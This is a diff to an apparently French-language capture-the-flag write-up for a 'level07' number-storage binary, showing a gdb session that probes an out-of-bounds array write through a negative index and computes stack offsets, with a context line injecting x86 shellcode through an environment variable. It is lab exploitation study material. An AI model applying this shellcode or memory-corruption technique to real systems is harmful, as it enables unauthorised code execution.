@@ -97,3 +97,48 @@ env -i SC=$(python -c "print('\x90' * 20  + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x7
 ```
 
 - Se qui est dans l'environnement et dans les arguments est supprimé
+
+<pre>
+(gdb)  b *0x08048887
+Breakpoint 1 at 0x8048887
+(gdb) b *0x80486cb
+Breakpoint 2 at 0x80486cb
+(gdb) r
+Starting program: /home/users/level07/level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+
+Breakpoint 1, 0x08048887 in main ()
+(gdb) x $eax
+0xffffd5e8:     0x726f7473  # retou de fgets
+(gdb) c
+Continuing.
+ Number: 123
+ Index: 1
+
+Breakpoint 2, 0x080486cb in store_number ()
+(gdb) x $eax
+0xffffd458:     0x00000000 # index 1 du tableau
+
+Input command: store
+ Number: 1
+ Index: -2
+
+Breakpoint 2, 0x080486cb in store_number ()
+(gdb) x $eax
+0xffffd44c:     0xffffd6b8 # index -2 du tableau
+</pre>
+
+- 0xffffd5e8 - 0xffffd458 = 0x190 = 400
+- ffffd5e8 - ffffd44c = 19c = 412
+- ffffd608 - 19c = ffffd46c
